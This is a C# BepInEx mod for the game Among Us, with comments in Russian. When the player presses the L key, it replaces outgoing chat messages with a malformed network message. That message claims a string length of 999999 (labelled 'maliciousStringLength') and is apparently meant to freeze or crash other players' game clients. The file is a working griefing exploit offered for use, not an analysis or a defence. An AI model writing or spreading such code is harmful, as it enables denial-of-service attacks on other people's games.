using BepInEx;
using BepInEx.Logging;
using HarmonyLib;
using System;
using AmongUs.GameOptions;
using Hazel;
using UnityEngine;

namespace AmongUsLagMod
{
    [BepInPlugin(PLUGIN_GUID, PLUGIN_NAME, PLUGIN_VERSION)]
    public class Plugin : BasePlugin
    {
        public const string PLUGIN_GUID = "com.yourname.amonguslagmod";
        public const string PLUGIN_NAME = "Among Us Lag Mod";
        public const string PLUGIN_VERSION = "1.0.0";

        private readonly Harmony harmony = new Harmony(PLUGIN_GUID);

        public static bool IsLagEnabled = false;

        public override void Load()
        {
            Log.LogInfo($"Плагин {PLUGIN_NAME} загружен!");

            harmony.PatchAll();
            
            if (InputManager.Exists)
            {
                InputManager.Instance.AddKeyDownAction(KeyCode.L, () => {
                    IsLagEnabled = !IsLagEnabled;
                    Log.LogInfo($"Режим зависания: {(IsLagEnabled ? "ВКЛ" : "ВЫКЛ")}");
                });
            }
            else
            {
                Log.LogWarning("InputManager не найден. Управление с клавиатуры не будет работать.");
            }
        }
        public override void Unload()
        {
            harmony.UnpatchSelf();
            Log.LogInfo($"Плагин {PLUGIN_NAME} выгружен.");
            base.Unload();
        }
    }

    [HarmonyPatch]
    internal static class Patches
    {
        [HarmonyPatch(typeof(PlayerControl), nameof(PlayerControl.RpcSendChat))]
        [HarmonyPrefix]
        private static bool RpcSendChat_Prefix(PlayerControl __instance, string chatText)
        {
            if (!Plugin.IsLagEnabled)
            {
                return true;
            }

            // Для логирования из статического класса нужно получить доступ к логгеру плагина.
            // Один из способов - передать его в конструктор, но проще сделать его публичным статическим.
            // В данном примере мы оставим логирование в основном классе плагина.
            // Если нужно здесь, можно сделать Log в Plugin публичным статическим.
            // Plugin.Log.LogWarning("Перехват отправки чата..."); // <-- так сработает, если Log в Plugin публичный

            MessageWriter writer = AmongUsClient.Instance.StartRpc(__instance.NetId, (byte)RpcCalls.SendChat);
            int maliciousStringLength = 999999;
            writer.Write(maliciousStringLength);
            writer.EndMessage();
            
            return false;
        }
    }
}
